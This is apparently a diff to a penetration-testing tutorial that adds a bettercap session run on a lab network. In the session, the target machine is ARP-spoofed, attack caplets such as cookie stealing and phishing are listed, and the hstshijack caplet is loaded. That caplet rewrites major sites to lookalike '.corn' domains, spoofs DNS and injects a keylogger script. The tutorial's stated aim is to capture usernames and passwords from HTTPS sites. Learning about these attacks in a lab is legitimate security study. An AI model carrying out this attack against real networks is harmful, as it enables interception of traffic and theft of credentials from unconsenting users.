@@ -312,5 +312,130 @@ The same can be performed using our automated script as well which is at the spe
 
   And, hit enter. This will run the caplet and will start downgrading HTTPS to HTTP.
 
-- Now, try visiting an HTTPS website on the target machine. You will see that the website is downgraded to HTTP and you can see all the HTTP requests and responses in real-time, including the username and password for HTTPS websites as well.
+  ```bash
+  root@kali:~# bettercap -iface eth0
+  bettercap v2.32.0 (built for linux amd64 with go1.22.3) [type 'help' for a list of commands]
+
+  192.168.175.0/24 > 192.168.175.129  » [19:49:31] [sys.log] [inf] gateway monitor started ...
+  192.168.175.0/24 > 192.168.175.129  » net.probe on
+  192.168.175.0/24 > 192.168.175.129  » [19:49:37] [sys.log] [inf] net.probe starting net.recon as a requirement for net.probe
+  192.168.175.0/24 > 192.168.175.129  » [19:49:37] [sys.log] [inf] net.probe probing 256 addresses on 192.168.175.0/24
+  192.168.175.0/24 > 192.168.175.129  » [19:49:37] [endpoint.new] endpoint 192.168.175.130 detected as 00:0c:29:23:e8:71 (VMware, Inc.).
+  192.168.175.0/24 > 192.168.175.129  » [19:49:37] [endpoint.new] endpoint 192.168.175.1 (DEVICE) detected as 00:50:56:c0:00:08 (VMware, Inc.).
+  192.168.175.0/24 > 192.168.175.129  » [19:49:37] [endpoint.new] endpoint 192.168.175.254 detected as 00:50:56:ec:70:c5 (VMware, Inc.).
+  192.168.175.0/24 > 192.168.175.129  » net.show
+
+  ┌─────────────────┬───────────────────┬─────────────────┬──────────────┬────────┬────────┬──────────┐
+  │      IP ▴       │        MAC        │      Name       │    Vendor    │  Sent  │ Recvd  │   Seen   │
+  ├─────────────────┼───────────────────┼─────────────────┼──────────────┼────────┼────────┼──────────┤
+  │ 192.168.175.129 │ 00:0c:29:11:90:95 │ eth0            │ VMware, Inc. │ 0 B    │ 0 B    │ 19:49:31 │
+  │ 192.168.175.2   │ 00:50:56:f1:40:75 │ gateway         │ VMware, Inc. │ 1.5 kB │ 897 B  │ 19:49:31 │
+  │                 │                   │                 │              │        │        │          │
+  │ 192.168.175.1   │ XX:XX:XX:XX:XX:XX │ DEVICE          │ VMware, Inc. │ 1.7 kB │ 319 B  │ 19:49:40 │
+  │ 192.168.175.130 │ 00:0c:29:23:e8:71 │                 │ VMware, Inc. │ 32 kB  │ 1.9 MB │ 19:49:41 │
+  │ 192.168.175.254 │ 00:50:56:ec:70:c5 │                 │ VMware, Inc. │ 0 B    │ 92 B   │ 19:49:37 │
+  └─────────────────┴───────────────────┴─────────────────┴──────────────┴────────┴────────┴──────────┘
+
+  ↑ 14 kB / ↓ 2.0 MB / 2402 pkts
+
+  192.168.175.0/24 > 192.168.175.129  » set arp.spoof.fullduplex true; set arp.spoof.targets 192.168.175.130;arp.spoof on
+  192.168.175.0/24 > 192.168.175.129  » [19:49:49] [sys.log] [war] arp.spoof full duplex spoofing enabled, if the router has ARP spoofing mechanisms, the attack will fail.
+  192.168.175.0/24 > 192.168.175.129  » [19:49:49] [sys.log] [inf] arp.spoof arp spoofer started, probing 1 targets.
+  192.168.175.0/24 > 192.168.175.129  » caplets.show
+
+  ┌─────────────────────────────────────┬────────────────────────────────────────────────────────────────────────────┬────────┐
+  │                Name                 │                                    Path                                    │  Size  │
+  ├─────────────────────────────────────┼────────────────────────────────────────────────────────────────────────────┼────────┤
+  │ ap                                  │ /usr/local/share/bettercap/caplets/ap.cap                                  │ 570 B  │
+  │ crypto-miner/crypto-miner           │ /usr/local/share/bettercap/caplets/crypto-miner/crypto-miner.cap           │ 666 B  │
+  │ download-autopwn/download-autopwn   │ /usr/local/share/bettercap/caplets/download-autopwn/download-autopwn.cap   │ 2.6 kB │
+  │ fb-phish/fb-phish                   │ /usr/local/share/bettercap/caplets/fb-phish/fb-phish.cap                   │ 140 B  │
+  │ gitspoof/gitspoof                   │ /usr/local/share/bettercap/caplets/gitspoof/gitspoof.cap                   │ 216 B  │
+  │ gps                                 │ /usr/local/share/bettercap/caplets/gps.cap                                 │ 109 B  │
+  │ hstshijack/hstshijack               │ /usr/local/share/bettercap/caplets/hstshijack/hstshijack.cap               │ 1.3 kB │
+  │ http-req-dump/http-req-dump         │ /usr/local/share/bettercap/caplets/http-req-dump/http-req-dump.cap         │ 591 B  │
+  │ http-ui                             │ /usr/local/share/bettercap/caplets/http-ui.cap                             │ 382 B  │
+  │ https-ui                            │ /usr/local/share/bettercap/caplets/https-ui.cap                            │ 661 B  │
+  │ jsinject/jsinject                   │ /usr/local/share/bettercap/caplets/jsinject/jsinject.cap                   │ 210 B  │
+  │ local-sniffer                       │ /usr/local/share/bettercap/caplets/local-sniffer.cap                       │ 244 B  │
+  │ login-manager-abuse/login-man-abuse │ /usr/local/share/bettercap/caplets/login-manager-abuse/login-man-abuse.cap │ 236 B  │
+  │ mana                                │ /usr/local/share/bettercap/caplets/mana.cap                                │ 61 B   │
+  │ massdeauth                          │ /usr/local/share/bettercap/caplets/massdeauth.cap                          │ 302 B  │
+  │ mitm6                               │ /usr/local/share/bettercap/caplets/mitm6.cap                               │ 551 B  │
+  │ netmon                              │ /usr/local/share/bettercap/caplets/netmon.cap                              │ 42 B   │
+  │ pita                                │ /usr/local/share/bettercap/caplets/pita.cap                                │ 900 B  │
+  │ proxy-script-test/proxy-script-test │ /usr/local/share/bettercap/caplets/proxy-script-test/proxy-script-test.cap │ 57 B   │
+  │ pwnagotchi-auto                     │ /usr/local/share/bettercap/caplets/pwnagotchi-auto.cap                     │ 330 B  │
+  │ pwnagotchi-manual                   │ /usr/local/share/bettercap/caplets/pwnagotchi-manual.cap                   │ 446 B  │
+  │ rogue-mysql-server                  │ /usr/local/share/bettercap/caplets/rogue-mysql-server.cap                  │ 501 B  │
+  │ rtfm/rtfm                           │ /usr/local/share/bettercap/caplets/rtfm/rtfm.cap                           │ 210 B  │
+  │ simple-passwords-sniffer            │ /usr/local/share/bettercap/caplets/simple-passwords-sniffer.cap            │ 131 B  │
+  │ steal-cookies/steal-cookies         │ /usr/local/share/bettercap/caplets/steal-cookies/steal-cookies.cap         │ 134 B  │
+  │ tcp-req-dump/tcp-req-dump           │ /usr/local/share/bettercap/caplets/tcp-req-dump/tcp-req-dump.cap           │ 413 B  │
+  │ web-override/web-override           │ /usr/local/share/bettercap/caplets/web-override/web-override.cap           │ 254 B  │
+  └─────────────────────────────────────┴────────────────────────────────────────────────────────────────────────────┴────────┘
+  192.168.175.0/24 > 192.168.175.129  » hstshijack/hstshijack
+  2025-11-11 19:50:06 inf hstshijack Generating random variable names for this session ...
+  2025-11-11 19:50:06 inf hstshijack Reading SSL log ...
+  2025-11-11 19:50:06 inf hstshijack Reading caplet ...
+  2025-11-11 19:50:06 inf hstshijack Module loaded.
+
+    Commands
+
+      hstshijack.show : Show module info.
+
+    Caplet
+
+                hstshijack.log > /usr/local/share/bettercap/caplets/hstshijack/ssl.log
+              hstshijack.ignore > *
+            hstshijack.targets > x.com,*.x.com,facebook.com,*.facebook.com,apple.com,*.apple.com,ebay.com,*.ebay.com,*.instagram.com,instagram.com,*.github.com,github.com,*.tiktok.com,tiktok.com,amazon.com,*.amazon.com
+        hstshijack.replacements > x.corn,*.x.corn,facebook.corn,*.facebook.corn,apple.corn,*.apple.corn,ebay.corn,*.ebay.corn,*.instagram.corn,instagram.corn,*.github.corn,github.corn,*.tiktok.corn,tiktok.corn,amazon.corn,*.amazon.corn
+        hstshijack.blockscripts > undefined
+          hstshijack.obfuscate > false
+              hstshijack.encode > false
+      hstshijack.payloads > *:/usr/local/share/bettercap/caplets/hstshijack/payloads/keylogger.js
+
+    Session info
+
+          Session ID : MwVuSDpFCtvFpqO
+        Callback Path : /XiAtMvkNRemVgK
+      Whitelist Path : /gfBlfewWQZhOFo
+        SSL Log Path : /IVUsbTk
+              SSL Log : 106 hosts
+
+  [19:50:06] [sys.log] [inf] http.proxy started on 192.168.175.129:8080 (sslstrip disabled)
+  [19:50:06] [sys.log] [inf] dns.spoof netflix.com -> 192.168.175.129
+  [19:50:06] [sys.log] [inf] dns.spoof linkedin.com -> 192.168.175.129
+  [19:50:06] [sys.log] [inf] dns.spoof *.netflix.com -> 192.168.175.129
+  [19:50:06] [sys.log] [inf] dns.spoof *.cnn.com -> 192.168.175.129
+  [19:50:06] [sys.log] [inf] dns.spoof *.linkedin.com -> 192.168.175.129
+  [19:50:06] [sys.log] [inf] dns.spoof stackoverflow.com -> 192.168.175.129
+  [19:50:06] [sys.log] [inf] dns.spoof *.stackoverflow.com -> 192.168.175.129
+  [19:50:06] [sys.log] [inf] dns.spoof cnn.com -> 192.168.175.129
+  [19:50:06] [sys.log] [inf] dns.spoof *.ebay.corn -> 192.168.175.129
+  [19:50:06] [sys.log] [inf] dns.spoof x.corn -> 192.168.175.129
+  [19:50:06] [sys.log] [inf] dns.spoof *.x.corn -> 192.168.175.129
+  [19:50:06] [sys.log] [inf] dns.spoof facebook.corn -> 192.168.175.129
+  [19:50:06] [sys.log] [inf] dns.spoof *.facebook.corn -> 192.168.175.129
+  [19:50:06] [sys.log] [inf] dns.spoof apple.corn -> 192.168.175.129
+  192.168.175.0/24 > 192.168.175.129  » [19:50:06] [sys.log] [inf] dns.spoof *.avg.com -> 192.168.175.129
+  192.168.175.0/24 > 192.168.175.129  » [19:50:06] [sys.log] [inf] dns.spoof *.instagram.corn -> 192.168.175.129
+  192.168.175.0/24 > 192.168.175.129  » [19:50:06] [sys.log] [inf] dns.spoof instagram.corn -> 192.168.175.129
+  192.168.175.0/24 > 192.168.175.129  » [19:50:06] [sys.log] [inf] dns.spoof *.github.corn -> 192.168.175.129
+  192.168.175.0/24 > 192.168.175.129  » [19:50:06] [sys.log] [inf] dns.spoof github.corn -> 192.168.175.129
+  192.168.175.0/24 > 192.168.175.129  » [19:50:06] [sys.log] [inf] dns.spoof winzip.com -> 192.168.175.129
+  192.168.175.0/24 > 192.168.175.129  » [19:50:06] [sys.log] [inf] dns.spoof *.winzip.com -> 192.168.175.129
+  192.168.175.0/24 > 192.168.175.129  » [19:50:06] [sys.log] [inf] dns.spoof avg.com -> 192.168.175.129
+  192.168.175.0/24 > 192.168.175.129  » [19:50:06] [sys.log] [inf] dns.spoof *.microsoft.com -> 192.168.175.129
+  192.168.175.0/24 > 192.168.175.129  » [19:50:06] [sys.log] [inf] dns.spoof tiktok.corn -> 192.168.175.129
+  192.168.175.0/24 > 192.168.175.129  » [19:50:06] [sys.log] [inf] dns.spoof *.tiktok.corn -> 192.168.175.129
+  192.168.175.0/24 > 192.168.175.129  » [19:50:06] [sys.log] [inf] dns.spoof microsoft.com -> 192.168.175.129
+  192.168.175.0/24 > 192.168.175.129  » [19:50:06] [sys.log] [inf] dns.spoof *.apple.corn -> 192.168.175.129
+  192.168.175.0/24 > 192.168.175.129  » [19:50:06] [sys.log] [inf] dns.spoof ebay.corn -> 192.168.175.129
+  192.168.175.0/24 > 192.168.175.129  » [19:50:06] [sys.log] [inf] dns.spoof *.amazon.corn -> 192.168.175.129
+  192.168.175.0/24 > 192.168.175.129  » [19:50:06] [sys.log] [inf] dns.spoof amazon.corn -> 192.168.175.129
+
+  ```
+
+- Now, try visiting an HTTPS website on the target machine. You will see that the website is downgraded to HTTP and you can see all the HTTP requests and responses in real-time, including the username and password for HTTPS websites as well. Try with `linkedin.com`.
 
